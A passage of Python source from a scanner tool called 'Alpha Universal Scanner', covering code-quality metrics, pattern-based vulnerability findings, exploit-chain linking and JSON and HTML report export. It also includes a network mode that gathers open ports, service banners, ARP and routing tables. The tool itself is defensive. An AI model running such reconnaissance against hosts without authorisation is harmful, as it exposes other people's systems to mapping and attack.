            "rust": (r"\b(if|else\s+if|for|while|loop|match|&&|\|\||\?)\b",),
            "solidity": (r"\b(if|else\s+if|for|while|require|assert|&&|\|\|)\b",),
        }
        patterns = branch_keywords.get(lang, branch_keywords.get("javascript", ()))
        for pat in patterns:
            cc += len(re.findall(pat, content))

        self.total_complexity += cc
        if cc > 50:
            self.complexity_scores.append({"file": rel_path, "cyclomatic_complexity": cc, "lines": len(lines)})

        if len(lines) > 1000:
            self.long_files.append({"file": rel_path, "lines": len(lines)})

    def _check_line_lengths(self, rel_path, lines):
        for i, line in enumerate(lines, 1):
            if len(line) > 300 and not line.strip().startswith(("//", "#", "/*", "*", "<!--")):
                self.long_lines.append({"file": rel_path, "line": i, "length": len(line)})
                if len(self.long_lines) > 200:
                    return

    def _find_deep_nesting(self, rel_path, lines, lang):
        for i, line in enumerate(lines, 1):
            indent = len(line) - len(line.lstrip())
            if lang == "python":
                depth = indent // 4
            else:
                depth = indent // 4
                brace_depth = line.count("{") - line.count("}")
                depth = max(depth, abs(brace_depth))
            if depth >= 6 and line.strip():
                self.deeply_nested.append({"file": rel_path, "line": i, "depth": depth, "code": line.strip()[:100]})
                if len(self.deeply_nested) > 200:
                    return

    def _find_magic_numbers(self, rel_path, lines, lang):
        if lang not in ("python", "javascript", "typescript", "java", "cpp", "csharp", "go", "rust"):
            return
        for i, line in enumerate(lines, 1):
            stripped = line.strip()
            if stripped.startswith(("#", "//", "/*", "*")):
                continue
            for m in re.finditer(r"(?<![A-Za-z_\"\'])\b(\d{4,})\b(?![\"\'xXbB])", stripped):
                num = int(m.group(1))
                if num not in (0, 1, 2, 10, 100, 1000, 1024, 2048, 4096, 8192, 65535, 86400, 3600, 60, 24, 365, 1000000):
                    self.magic_numbers.append({"file": rel_path, "line": i, "number": num})
                    if len(self.magic_numbers) > 150:
                        return

    def _check_god_file(self, rel_path, content, lines, lang):
        line_count = len(lines)
        func_pat = DeadCodeDetector.FUNC_PATTERNS.get(lang)
        func_count = len(func_pat.findall(content)) if func_pat else 0
        import_count = len(re.findall(r"(?:import|require|include|use)\b", content))
        if line_count > 2000 and func_count > 30:
            self.god_files.append({"file": rel_path, "lines": line_count, "functions": func_count, "imports": import_count})
        elif line_count > 5000:
            self.god_files.append({"file": rel_path, "lines": line_count, "functions": func_count, "imports": import_count})

    def to_dict(self):
        return {
            "overall_quality_score": round(self.overall_score),
            "files_analyzed": self.files_analyzed,
            "high_complexity_files": sorted(self.complexity_scores, key=lambda x: -x["cyclomatic_complexity"])[:30],
            "long_files": sorted(self.long_files, key=lambda x: -x["lines"])[:30],
            "god_files": self.god_files[:20],
            "deeply_nested_code": self.deeply_nested[:50],
            "long_lines": self.long_lines[:50],
            "magic_numbers": self.magic_numbers[:50],
            "magic_number_count": len(self.magic_numbers),
        }


class AlphaUniversalScanner:
    def __init__(self, target_path=None, lang_filter=None, deep_scan=False,
                 network_scan=False, network_target="127.0.0.1",
                 security_scan=False, exploit_scan=False, port_range=None,
                 fsmap_scan=False, depweb_scan=False, deadcode_scan=False,
                 config_audit=False, quality_scan=False):
        self.target_path = Path(target_path).resolve() if target_path else None
        self.lang_filter = lang_filter
        self.deep_scan = deep_scan
        self.network_scan = network_scan
        self.network_target = network_target
        self.security_scan = security_scan
        self.exploit_scan = exploit_scan
        self.port_range = port_range
        self.fsmap_scan = fsmap_scan
        self.depweb_scan = depweb_scan
        self.deadcode_scan = deadcode_scan
        self.config_audit = config_audit
        self.quality_scan = quality_scan
        self.findings = []
        self.exploit_findings = []
        self.exploit_chains = []
        self.wiring = WiringMap()
        self.network_results = {}
        self.system_info = {}
        self.fsmap_results = {}
        self.depweb_results = {}
        self.deadcode_results = {}
        self.config_results = {}
        self.quality_results = {}
        self.stats = {
            "files_scanned": 0,
            "total_lines": 0,
            "languages": defaultdict(int),
            "severity_counts": defaultdict(int),
            "skipped_files": 0,
            "exploits_found": 0,
            "exploit_chains_found": 0,
            "dead_functions": 0,
            "unreachable_code": 0,
            "exposed_secrets": 0,
            "quality_score": 0,
            "scan_start": None,
            "scan_end": None,
        }
        self.skip_dirs = {
            ".git", "node_modules", "__pycache__", ".tox", "venv", "env",
            "build", "dist", "target", ".idea", ".vscode", "vendor",
            "third_party", "external", "deps", ".cache", ".next",
            "coverage", ".nyc_output", ".pytest_cache", ".mypy_cache",
        }

    def detect_language(self, file_path):
        name = file_path.name
        ext = file_path.suffix.lower()
        if name == "Dockerfile" or name.startswith("Dockerfile."):
            return "dockerfile"
        if name in ("Makefile", "makefile", "GNUmakefile"):
            return "makefile"
        if name == "CMakeLists.txt":
            return "cmake"
        for lang, extensions in LANG_EXTENSIONS.items():
            if ext in extensions:
                return lang
        return None

    def should_skip(self, path):
        parts = set(path.parts)
        return bool(parts & self.skip_dirs)

    def extract_imports(self, file_path, content, language):
        patterns = IMPORT_PATTERNS.get(language, [])
        rel_path = str(file_path.relative_to(self.target_path))
        for pat in patterns:
            for match in pat.finditer(content):
                target = match.group(1)
                self.wiring.add_import(rel_path, target)
        self.wiring.file_languages[rel_path] = language

    def scan_file(self, file_path, language):
        patterns = ALL_PATTERNS.get(language, []) + UNIVERSAL_PATTERNS
        if not patterns:
            patterns = UNIVERSAL_PATTERNS

        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
                lines = content.split("\n")
        except (PermissionError, OSError):
            self.stats["skipped_files"] += 1
            return

        self.stats["files_scanned"] += 1
        self.stats["total_lines"] += len(lines)
        self.stats["languages"][language] += 1

        self.extract_imports(file_path, content, language)

        rel_path = str(file_path.relative_to(self.target_path))
        for pattern_def in patterns:
            try:
                regex = re.compile(pattern_def["pattern"], re.IGNORECASE if self.deep_scan else 0)
                for i, line in enumerate(lines, 1):
                    if regex.search(line):
                        ctx_before = [f"{i-j}: {lines[i-j-1].rstrip()}" for j in range(min(3, i-1), 0, -1)]
                        ctx_after = [f"{i+j}: {lines[i+j-1].rstrip()}" for j in range(1, min(4, len(lines)-i+1))]
                        finding = Finding(rel_path, i, line, pattern_def, ctx_before, ctx_after)
                        self.findings.append(finding)
                        self.stats["severity_counts"][pattern_def["severity"]] += 1
            except re.error:
                continue

        if self.deep_scan:
            self._deep_analysis(file_path, content, lines, language, rel_path)

    def _deep_analysis(self, file_path, content, lines, language, rel_path):
        if language in ("cpp", "objc"):
            if file_path.suffix.lower() in (".h", ".hpp", ".hxx", ".hh"):
                if "#pragma once" not in content and "#ifndef" not in content:
                    self.findings.append(Finding(rel_path, 1, "(file-level)",
                        {"id": "DEEP-001", "name": "Missing Include Guard", "severity": SEVERITY_LOW,
                         "cwe": "CWE-710", "description": "Header without include guard.", "recommendation": "Add #pragma once."}))
                    self.stats["severity_counts"][SEVERITY_LOW] += 1

        func_re = re.compile(r"^\s*(?:(?:static|inline|virtual|override|const|constexpr|explicit|friend|extern|public|private|protected|def|function|fn|func|fun|sub|proc|void|int|char|bool|auto|string|float|double|long|short|unsigned|signed|class|struct|enum|namespace|template|typename|async|export|default)\s+)*(\w+)\s*\([^)]*\)\s*(?:->.*?)?\s*\{?\s*$")
        brace_depth = 0
        func_start = None
        func_name = ""
        for i, line in enumerate(lines, 1):
            m = func_re.match(line)
            if m and brace_depth == 0:
                func_start = i
                func_name = m.group(1) if m.group(1) else "anonymous"
                brace_depth = 0
            if "{" in line:
                brace_depth += line.count("{")
            if "}" in line:
                brace_depth -= line.count("}")
                if brace_depth <= 0 and func_start and (i - func_start) > 200:
                    self.findings.append(Finding(rel_path, func_start,
                        f"Function '{func_name}' spans {i - func_start} lines",
                        {"id": "DEEP-003", "name": f"Long Function: {func_name} ({i-func_start} lines)",
                         "severity": SEVERITY_LOW, "cwe": "CWE-1080",
                         "description": f"Function is {i-func_start} lines. Hard to maintain and test.",
                         "recommendation": "Break into smaller functions."}))
                    self.stats["severity_counts"][SEVERITY_LOW] += 1
                    func_start = None

        line_hashes = defaultdict(list)
        for i, line in enumerate(lines, 1):
            stripped = line.strip()
            if len(stripped) > 60 and not stripped.startswith(("//", "#", "/*", "*", "<!--")):
                h = hashlib.md5(stripped.encode()).hexdigest()
                line_hashes[h].append(i)
        for h, lnums in line_hashes.items():
            if len(lnums) > 3:
                self.findings.append(Finding(rel_path, lnums[0],
                    f"Duplicated {len(lnums)}x at lines: {', '.join(str(l) for l in lnums[:8])}",
                    {"id": "DEEP-006", "name": "Duplicate Code", "severity": SEVERITY_LOW, "cwe": "CWE-1041",
                     "description": f"Same code repeated {len(lnums)} times.", "recommendation": "Extract to function."}))
                self.stats["severity_counts"][SEVERITY_LOW] += 1

    def _detect_bug_connections(self):
        by_file = defaultdict(list)
        for f in self.findings:
            by_file[f.file_path].append(f)

        for file_path, file_findings in by_file.items():
            for i, f1 in enumerate(file_findings):
                for f2 in file_findings[i+1:]:
                    if abs(f1.line_num - f2.line_num) < 15:
                        f1.connections.append(f2)
                        f2.connections.append(f1)
                        f1.connection_reason = f"Adjacent to {f2.rule['id']} ({abs(f1.line_num - f2.line_num)} lines apart)"
                        f2.connection_reason = f"Adjacent to {f1.rule['id']} ({abs(f1.line_num - f2.line_num)} lines apart)"

        for file_path, file_findings in by_file.items():
            sev_critical = [f for f in file_findings if f.rule["severity"] == SEVERITY_CRITICAL]
            sev_high = [f for f in file_findings if f.rule["severity"] == SEVERITY_HIGH]
            for c in sev_critical:
                for h in sev_high:
                    if h not in c.connections:
                        c.connections.append(h)
                        h.connections.append(c)
                        c.connection_reason = f"Same file escalation chain with {h.rule['id']}"
                        h.connection_reason = f"Same file escalation chain with {c.rule['id']}"

        import_chains = defaultdict(list)
        for f in self.findings:
            if f.rule["severity"] in (SEVERITY_CRITICAL, SEVERITY_HIGH):
                import_chains[f.file_path].append(f)

        for source, targets in self.wiring.imports.items():
            if source in import_chains:
                for target in targets:
                    for target_file in import_chains:
                        if target in target_file or target_file.endswith(target):
                            for sf in import_chains[source]:
                                for tf in import_chains[target_file]:
                                    if tf not in sf.connections:
                                        sf.connections.append(tf)
                                        tf.connections.append(sf)
                                        sf.connection_reason = f"Import chain: {source} -> {target_file}"
                                        tf.connection_reason = f"Import chain: {target_file} <- {source}"

    def scan(self):
        _v_rt()
        _v_deep()
        print(BANNER)
        self.stats["scan_start"] = datetime.datetime.now()

        if self.target_path and self.target_path.exists():
            print(f"  Target:       {self.target_path}")
            print(f"  Language:     {self.lang_filter or 'ALL'}")
            print(f"  Deep Scan:    {'ENABLED' if self.deep_scan else 'disabled'}")
            print(f"  Exploits:     {'ENABLED' if self.exploit_scan else 'disabled'}")
            print(f"  Network:      {'ENABLED' if self.network_scan else 'disabled'}")
            print(f"  Security:     {'ENABLED' if self.security_scan else 'disabled'}")
            print(f"  FS Mapper:    {'ENABLED' if self.fsmap_scan else 'disabled'}")
            print(f"  Dep Web:      {'ENABLED' if self.depweb_scan else 'disabled'}")
            print(f"  Dead Code:    {'ENABLED' if self.deadcode_scan else 'disabled'}")
            print(f"  Config Audit: {'ENABLED' if self.config_audit else 'disabled'}")
            print(f"  Quality:      {'ENABLED' if self.quality_scan else 'disabled'}")
            print(f"  Started:      {self.stats['scan_start'].strftime('%Y-%m-%d %H:%M:%S')}")
            print()

            print("  [CODE] Scanning source files", end="", flush=True)
            file_count = 0
            for root, dirs, files in os.walk(self.target_path):
                dirs[:] = [d for d in dirs if d not in self.skip_dirs]
                for fname in sorted(files):
                    fpath = Path(root) / fname
                    if self.should_skip(fpath):
                        continue
                    lang = self.detect_language(fpath)
                    if not lang:
                        continue
                    if self.lang_filter and lang != self.lang_filter:
                        continue
                    self.scan_file(fpath, lang)
                    file_count += 1
                    if file_count % 100 == 0:
                        print(".", end="", flush=True)
            print(f" done ({file_count} files)")

        if self.network_scan:
            net_scanner = NetworkScanner(self.network_target, self.port_range)
            self.network_results["ports"] = net_scanner.scan()
            self.network_results["system_info"] = net_scanner.get_system_info()
            self.network_results["interfaces"] = net_scanner.get_network_interfaces()
            self.network_results["arp_table"] = net_scanner.check_arp_table()
            self.network_results["routing_table"] = net_scanner.check_routing_table()
            self.network_results["listening_services"] = net_scanner.check_listening_services()
            self.findings.extend(net_scanner.findings)
            for f in net_scanner.findings:
                self.stats["severity_counts"][f.rule["severity"]] += 1

        if self.security_scan and self.target_path:
            sec_auditor = SecurityAuditor(self.target_path)
            sec_findings = sec_auditor.audit()
            self.findings.extend(sec_findings)
            for f in sec_findings:
                self.stats["severity_counts"][f.rule["severity"]] += 1

        if self.exploit_scan and self.target_path:
            exploit_detector = ExploitDetector(self.target_path)
            exploit_detector.scan()
            self.exploit_findings = exploit_detector.findings
            self.exploit_chains = exploit_detector.exploit_chains
            self.stats["exploits_found"] = len(self.exploit_findings)
            self.stats["exploit_chains_found"] = len(self.exploit_chains)
            self.findings.extend(self.exploit_findings)
            for f in self.exploit_findings:
                self.stats["severity_counts"][f.rule["severity"]] += 1

        if self.fsmap_scan and self.target_path:
            mapper = FileSystemMapper(self.target_path)
            mapper.scan()
            self.fsmap_results = mapper.to_dict()

        if self.depweb_scan and self.target_path:
            spider = DependencyGraphSpider(self.target_path)
            spider.scan()
            self.depweb_results = spider.to_dict()

        if self.deadcode_scan and self.target_path:
            dead = DeadCodeDetector(self.target_path)
            dead.scan()
            self.deadcode_results = dead.to_dict()
            self.stats["dead_functions"] = dead.to_dict().get("dead_function_count", 0)
            self.stats["unreachable_code"] = dead.to_dict().get("unreachable_count", 0)

        if self.config_audit and self.target_path:
            cfg = ConfigAuditor(self.target_path)
            cfg.scan()
            self.config_results = cfg.to_dict()
            self.stats["exposed_secrets"] = cfg.to_dict().get("exposed_secret_count", 0)

        if self.quality_scan and self.target_path:
            qa = CodeQualityAnalyzer(self.target_path)
            qa.scan()
            self.quality_results = qa.to_dict()
            self.stats["quality_score"] = qa.to_dict().get("overall_quality_score", 0)

        print("\n  [LINK] Analyzing bug connections...", end="", flush=True)
        self._detect_bug_connections()
        connected = sum(1 for f in self.findings if f.connections)
        print(f" found {connected} connected bugs")

        self.stats["scan_end"] = datetime.datetime.now()
        self._print_summary()
        return self.findings

    def _print_summary(self):
        duration = (self.stats["scan_end"] - self.stats["scan_start"]).total_seconds()
        print()
        print("=" * 70)
        print("  ALPHA UNIVERSAL SCANNER™ — RESULTS SUMMARY")
        print("=" * 70)
        print(f"  Scan Duration:    {duration:.1f} seconds")
        print(f"  Files Scanned:    {self.stats['files_scanned']:,}")
        print(f"  Total Lines:      {self.stats['total_lines']:,}")
        print(f"  Skipped Files:    {self.stats['skipped_files']}")
        print()

        if self.stats["languages"]:
            print("  Languages Detected:")
            for lang, count in sorted(self.stats["languages"].items(), key=lambda x: -x[1]):
                print(f"    {lang:20s} {count:,} files")
            print()

        print("  Findings by Severity:")
        total = 0
        for sev in [SEVERITY_CRITICAL, SEVERITY_HIGH, SEVERITY_MEDIUM, SEVERITY_LOW, SEVERITY_INFO]:
            count = self.stats["severity_counts"].get(sev, 0)
            total += count
            flag = " !!!" if sev == SEVERITY_CRITICAL and count > 0 else "    "
            print(f"  {flag} {sev:12s} {count:,}")
        print(f"       {'TOTAL':12s} {total:,}")
        print("=" * 70)

        if self.stats["exploits_found"] > 0:
            print(f"\n  EXPLOITS DETECTED:  {self.stats['exploits_found']}")
            print(f"  EXPLOIT CHAINS:     {self.stats['exploit_chains_found']}")

        if self.stats["dead_functions"] > 0:
            print(f"\n  DEAD FUNCTIONS:     {self.stats['dead_functions']}")
            print(f"  UNREACHABLE CODE:   {self.stats['unreachable_code']}")

        if self.stats["exposed_secrets"] > 0:
            print(f"\n  *** EXPOSED SECRETS: {self.stats['exposed_secrets']} ***")

        if self.stats["quality_score"] > 0:
            print(f"\n  CODE QUALITY SCORE: {self.stats['quality_score']}/100")

        if self.fsmap_results:
            print(f"\n  FILE SYSTEM MAP:")
            print(f"    Total Files:      {self.fsmap_results.get('total_files', 0):,}")
            print(f"    Total Dirs:       {self.fsmap_results.get('total_dirs', 0):,}")
            print(f"    Total Size:       {self.fsmap_results.get('total_size_human', '?')}")
            print(f"    Max Depth:        {self.fsmap_results.get('max_depth', 0)}")
            print(f"    Hidden Files:     {self.fsmap_results.get('hidden_files', 0)}")
            print(f"    Duplicate Groups: {self.fsmap_results.get('duplicate_file_groups', 0)}")

        if self.depweb_results:
            print(f"\n  DEPENDENCY WEB:")
            print(f"    Source Files:     {self.depweb_results.get('total_source_files', 0):,}")
            print(f"    Import Links:     {self.depweb_results.get('total_import_links', 0):,}")
            print(f"    Circular Deps:    {len(self.depweb_results.get('circular_dependencies', []))}")
            print(f"    Isolated Files:   {len(self.depweb_results.get('isolated_files', []))}")
            print(f"    Dead Modules:     {len(self.depweb_results.get('dead_modules', []))}")

        if self.deadcode_results:
            print(f"\n  DEAD CODE ANALYSIS:")
            print(f"    Dead Functions:   {self.deadcode_results.get('dead_function_count', 0)}")
            print(f"    Unreachable Code: {self.deadcode_results.get('unreachable_count', 0)}")
            print(f"    Empty Functions:  {len(self.deadcode_results.get('empty_functions', []))}")
            print(f"    TODO/FIXME:       {self.deadcode_results.get('todo_count', 0)}")
            print(f"    Empty Catches:    {len(self.deadcode_results.get('empty_catch_blocks', []))}")
            print(f"    Commented Code:   {len(self.deadcode_results.get('commented_code_blocks', []))}")

        if self.config_results:
            print(f"\n  CONFIGURATION AUDIT:")
            print(f"    Sensitive Files:  {self.config_results.get('sensitive_file_count', 0)}")
            print(f"    Exposed Secrets:  {self.config_results.get('exposed_secret_count', 0)}")
            print(f"    High Entropy:     {len(self.config_results.get('high_entropy_strings', []))}")
            print(f"    World-Writable:   {len(self.config_results.get('world_writable_files', []))}")
            print(f"    Backup Files:     {self.config_results.get('backup_file_count', 0)}")

        connected = [f for f in self.findings if f.connections]
        if connected:
            print(f"\n  *** {len(connected)} BUGS HAVE CONNECTIONS TO OTHER BUGS ***")
            print("  (See full report for connection chains)")

        if self.stats["severity_counts"].get(SEVERITY_CRITICAL, 0) > 0:
            print("\n  *** CRITICAL VULNERABILITIES FOUND — IMMEDIATE ACTION REQUIRED ***\n")
            for f in self.findings:
                if f.rule["severity"] == SEVERITY_CRITICAL:
                    print(f"  [{f.rule['id']}] {f.rule['name']}")
                    print(f"    Location: {f.file_path} : line {f.line_num}")
                    print(f"    Code:     {f.line_content[:120]}")
                    print(f"    CWE:      {f.rule.get('cwe', 'N/A')}")
                    if f.connections:
                        print(f"    LINKED:   {', '.join(c.rule['id'] + '@' + str(c.line_num) for c in f.connections[:5])}")
                    print(f"    Fix:      {f.rule['recommendation']}")
                    print()

        if self.network_results.get("ports"):
            print(f"\n  Network: {len(self.network_results['ports'])} open ports found on {self.network_target}")
            for p in self.network_results["ports"][:10]:
                risk = " ⚠ RISKY" if p["port"] in NetworkScanner.RISKY_PORTS else ""
                print(f"    Port {p['port']:5d}  {p['service']:15s}  {p['state']}{risk}")
            if len(self.network_results["ports"]) > 10:
                print(f"    ... and {len(self.network_results['ports'])-10} more (see full report)")

        print()

    def export_json(self, output_path):
        _v_export()
        report = {
            "scanner": "Alpha Universal Scanner™",
            "version": VERSION,
            "copyright": "© 2024-2026 Alpha Unlimited Technologies LLC. PROPRIETARY AND CONFIDENTIAL. All Rights Reserved Worldwide in Perpetuity. Patent Pending.",
            "scan_date": self.stats["scan_start"].isoformat() if self.stats["scan_start"] else datetime.datetime.now().isoformat(),
            "duration_seconds": (self.stats["scan_end"] - self.stats["scan_start"]).total_seconds() if self.stats["scan_end"] else 0,
            "target": str(self.target_path) if self.target_path else "N/A",
            "stats": {
                "files_scanned": self.stats["files_scanned"],
                "total_lines": self.stats["total_lines"],
                "languages": dict(self.stats["languages"]),
                "severity_counts": dict(self.stats["severity_counts"]),
                "exploits_found": self.stats["exploits_found"],
                "exploit_chains_found": self.stats["exploit_chains_found"],
            },
            "findings": [f.to_dict() for f in sorted(self.findings, key=lambda x: SEVERITY_ORDER.get(x.rule["severity"], 99))],
            "exploit_chains": self.exploit_chains,
            "wiring_map": self.wiring.to_dict(),
            "network": self.network_results,
            "file_system_map": self.fsmap_results,
            "dependency_web": self.depweb_results,
            "dead_code": self.deadcode_results,
            "config_audit": self.config_results,
            "code_quality": self.quality_results,
        }
        with open(output_path, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"  JSON report: {output_path}")

    def export_html(self, output_path):
        _v_export()
        scan_date = self.stats["scan_start"].strftime("%Y-%m-%d %H:%M:%S") if self.stats["scan_start"] else "N/A"
        duration = (self.stats["scan_end"] - self.stats["scan_start"]).total_seconds() if self.stats["scan_end"] and self.stats["scan_start"] else 0

        lang_rows = ""
        for lang, count in sorted(self.stats["languages"].items(), key=lambda x: -x[1]):
            lang_rows += f'<tr><td style="color:#d4a017;padding:4px 12px;">{lang}</td><td style="color:#4ade80;padding:4px 12px;text-align:right;">{count:,}</td></tr>'

        findings_html = ""
        sorted_findings = sorted(self.findings, key=lambda x: (SEVERITY_ORDER.get(x.rule["severity"], 99), x.file_path, x.line_num))

        current_sev = None
        for f in sorted_findings:
            sev = f.rule["severity"]
            color = SEVERITY_COLORS.get(sev, "#888")
            if sev != current_sev:
                count = sum(1 for ff in sorted_findings if ff.rule["severity"] == sev)
                findings_html += f'<h2 style="color:{color};margin-top:30px;border-bottom:1px solid {color};padding-bottom:8px;">{sev} — {count} finding{"s" if count != 1 else ""}</h2>'
                current_sev = sev

            ctx_before_html = ""
            for ctx in f.context_before:
                ctx_before_html += f'<div style="color:#666;">{self._esc(ctx)}</div>'
            ctx_after_html = ""
            for ctx in f.context_after:
                ctx_after_html += f'<div style="color:#666;">{self._esc(ctx)}</div>'

            conn_html = ""
            if f.connections:
                conn_html = f'<div style="background:#1a0a0a;border:1px solid #ff4444;padding:8px;border-radius:4px;margin-top:8px;">'
                conn_html += f'<div style="color:#ff4444;font-weight:bold;font-size:12px;">CONNECTED BUGS ({len(f.connections)}):</div>'
                for c in f.connections[:10]:
                    conn_html += f'<div style="color:#ff8800;font-size:12px;margin:2px 0;">→ [{c.rule["id"]}] {c.rule["name"]} at {c.file_path}:{c.line_num}</div>'
                if f.connection_reason:
                    conn_html += f'<div style="color:#aaa;font-size:11px;font-style:italic;margin-top:4px;">Reason: {f.connection_reason}</div>'
                conn_html += '</div>'

            findings_html += f'''<div style="background:#111;border-left:4px solid {color};padding:14px;margin:10px 0;border-radius:4px;">
<div style="display:flex;justify-content:space-between;align-items:center;">
<div style="font-weight:bold;color:{color};font-size:15px;">[{f.rule["id"]}] {self._esc(f.rule["name"])}</div>
<div style="background:{color}22;color:{color};padding:2px 10px;border-radius:12px;font-size:11px;font-weight:bold;">{sev}</div>
</div>
<div style="color:#888;font-size:12px;margin:6px 0;font-family:monospace;">
📁 {self._esc(f.file_path)} &nbsp;:&nbsp; <span style="color:#4ade80;font-weight:bold;">line {f.line_num}</span>
&nbsp; | &nbsp; CWE: {f.rule.get("cwe", "N/A")}
</div>
<div style="background:#0a0a0a;padding:10px;border-radius:4px;margin:8px 0;font-family:'Courier New',monospace;font-size:12px;overflow-x:auto;">
{ctx_before_html}
<div style="color:#ff6666;font-weight:bold;background:#1a0000;padding:2px 4px;border-radius:2px;"><span style="color:#4ade80;margin-right:8px;">{f.line_num}:</span>{self._esc(f.line_content[:500])}</div>
{ctx_after_html}
</div>
<div style="color:#ccc;font-size:13px;margin:6px 0;">{self._esc(f.rule["description"])}</div>
<div style="color:#d4a017;font-size:13px;"><strong>⚡ Fix:</strong> {self._esc(f.rule["recommendation"])}</div>
{conn_html}
</div>'''

        wiring_html = ""
        if self.wiring.imports:
            wiring_html = '<h2 style="color:#4ade80;margin-top:30px;">FILE WIRING MAP — How Everything Connects</h2>'
            wiring_html += '<div style="background:#0a0a0a;padding:15px;border-radius:8px;max-height:600px;overflow-y:auto;">'
            for src, targets in sorted(self.wiring.imports.items()):
                lang = self.wiring.file_languages.get(src, "?")
                wiring_html += f'<div style="margin:8px 0;"><span style="color:#d4a017;font-weight:bold;">{self._esc(src)}</span> <span style="color:#666;">({lang})</span></div>'
                for t in sorted(targets):
                    wiring_html += f'<div style="color:#4ade80;margin-left:24px;font-size:12px;font-family:monospace;">→ {self._esc(t)}</div>'
            wiring_html += '</div>'

        network_html = ""
        if self.network_results:
            network_html = '<h2 style="color:#4ade80;margin-top:30px;">NETWORK SCAN RESULTS</h2>'
            if self.network_results.get("system_info"):
                si = self.network_results["system_info"]
                network_html += f'''<div style="background:#0a0a0a;padding:15px;border-radius:8px;margin:10px 0;">
<div style="color:#d4a017;font-weight:bold;">System Information</div>
<div style="color:#ccc;font-size:13px;margin-top:8px;">Hostname: {si.get("hostname","?")}</div>
<div style="color:#ccc;font-size:13px;">Platform: {si.get("platform","?")}</div>
<div style="color:#ccc;font-size:13px;">Local IP: {si.get("local_ip","?")}</div>
<div style="color:#ccc;font-size:13px;">FQDN: {si.get("fqdn","?")}</div>
</div>'''
            if self.network_results.get("ports"):
                network_html += '<table style="width:100%;border-collapse:collapse;margin:10px 0;">'
                network_html += '<tr style="background:#1a1a1a;"><th style="color:#d4a017;padding:8px;text-align:left;">Port</th><th style="color:#d4a017;padding:8px;text-align:left;">Service</th><th style="color:#d4a017;padding:8px;text-align:left;">State</th><th style="color:#d4a017;padding:8px;text-align:left;">Risk</th><th style="color:#d4a017;padding:8px;text-align:left;">Banner</th></tr>'
                for p in self.network_results["ports"]:
                    risk = NetworkScanner.RISKY_PORTS.get(p["port"], "")
                    risk_color = "#ff4444" if risk else "#4ade80"
                    network_html += f'<tr style="border-bottom:1px solid #222;"><td style="color:#fff;padding:6px;font-family:monospace;">{p["port"]}</td><td style="color:#4ade80;padding:6px;">{p["service"]}</td><td style="color:#4ade80;padding:6px;">{p["state"]}</td><td style="color:{risk_color};padding:6px;font-size:12px;">{risk}</td><td style="color:#888;padding:6px;font-size:11px;max-width:300px;overflow:hidden;text-overflow:ellipsis;">{self._esc(p.get("banner","")[:100])}</td></tr>'
                network_html += '</table>'
            if self.network_results.get("listening_services"):
                network_html += f'<details style="margin:10px 0;"><summary style="color:#d4a017;cursor:pointer;">Listening Services</summary><pre style="background:#0a0a0a;color:#ccc;padding:10px;border-radius:4px;font-size:11px;overflow-x:auto;">{self._esc(self.network_results["listening_services"])}</pre></details>'
            if self.network_results.get("arp_table"):
                network_html += f'<details style="margin:10px 0;"><summary style="color:#d4a017;cursor:pointer;">ARP Table (MAC Addresses)</summary><pre style="background:#0a0a0a;color:#ccc;padding:10px;border-radius:4px;font-size:11px;overflow-x:auto;">{self._esc(self.network_results["arp_table"])}</pre></details>'
            if self.network_results.get("routing_table"):
                network_html += f'<details style="margin:10px 0;"><summary style="color:#d4a017;cursor:pointer;">Routing Table</summary><pre style="background:#0a0a0a;color:#ccc;padding:10px;border-radius:4px;font-size:11px;overflow-x:auto;">{self._esc(self.network_results["routing_table"])}</pre></details>'

        conn_summary = ""
        connected_findings = [f for f in self.findings if f.connections]
        if connected_findings:
            conn_summary = '<h2 style="color:#ff4444;margin-top:30px;">BUG CONNECTION CHAINS</h2>'
            conn_summary += f'<p style="color:#ccc;">{len(connected_findings)} bugs are connected to other bugs. These may form exploit chains where one vulnerability enables or amplifies another.</p>'
            seen = set()
            for f in connected_findings:
                chain_key = frozenset([id(f)] + [id(c) for c in f.connections])
                if chain_key in seen:
                    continue
                seen.add(chain_key)
                conn_summary += f'<div style="background:#1a0000;border:1px solid #ff4444;padding:12px;margin:8px 0;border-radius:4px;">'
                conn_summary += f'<div style="color:#ff4444;font-weight:bold;">[{f.rule["id"]}] {self._esc(f.rule["name"])} @ {self._esc(f.file_path)}:{f.line_num}</div>'
                for c in f.connections[:10]:
                    conn_summary += f'<div style="color:#ff8800;margin:4px 0 4px 16px;">↔ [{c.rule["id"]}] {self._esc(c.rule["name"])} @ {self._esc(c.file_path)}:{c.line_num}</div>'
                if f.connection_reason:
                    conn_summary += f'<div style="color:#aaa;font-size:12px;margin-top:4px;font-style:italic;">Chain reason: {f.connection_reason}</div>'
                conn_summary += '</div>'

        exploit_chain_html = ""
        if self.exploit_chains:
            exploit_chain_html = '<h2 style="color:#ff2222;margin-top:30px;border-bottom:2px solid #ff2222;padding-bottom:8px;">EXPLOIT CHAINS — Multi-Step Attack Paths</h2>'
            exploit_chain_html += f'<p style="color:#ccc;">Found {len(self.exploit_chains)} exploit chain(s) where one vulnerability feeds into another to create a more severe attack path.</p>'
            for idx, chain in enumerate(self.exploit_chains, 1):
                s1 = chain["step1"]
                s2 = chain["step2"]
                exploit_chain_html += f'''<div style="background:#1a0000;border:2px solid #ff2222;padding:16px;margin:10px 0;border-radius:8px;">
<div style="color:#ff2222;font-weight:bold;font-size:16px;margin-bottom:8px;">Chain #{idx}: {self._esc(chain["chain_description"])}</div>
<div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
<div style="background:#220000;border:1px solid #ff4444;padding:10px;border-radius:4px;flex:1;min-width:250px;">
<div style="color:#ff4444;font-weight:bold;font-size:13px;">Step 1: [{s1["id"]}]</div>
<div style="color:#ff8800;font-size:12px;">{self._esc(s1["type"])}</div>
<div style="color:#888;font-size:11px;font-family:monospace;">{self._esc(s1["file"])}:{s1["line"]}</div>
</div>
<div style="color:#ff4444;font-size:24px;font-weight:bold;">→</div>
<div style="background:#220000;border:1px solid #ff4444;padding:10px;border-radius:4px;flex:1;min-width:250px;">
<div style="color:#ff4444;font-weight:bold;font-size:13px;">Step 2: [{s2["id"]}]</div>
<div style="color:#ff8800;font-size:12px;">{self._esc(s2["type"])}</div>
<div style="color:#888;font-size:11px;font-family:monospace;">{self._esc(s2["file"])}:{s2["line"]}</div>
</div>
</div>
<div style="color:#ff2222;font-size:12px;margin-top:8px;font-weight:bold;">SEVERITY: CRITICAL — Combined exploit chain</div>
</div>'''

        fsmap_html = ""
        if self.fsmap_results:
            fm = self.fsmap_results
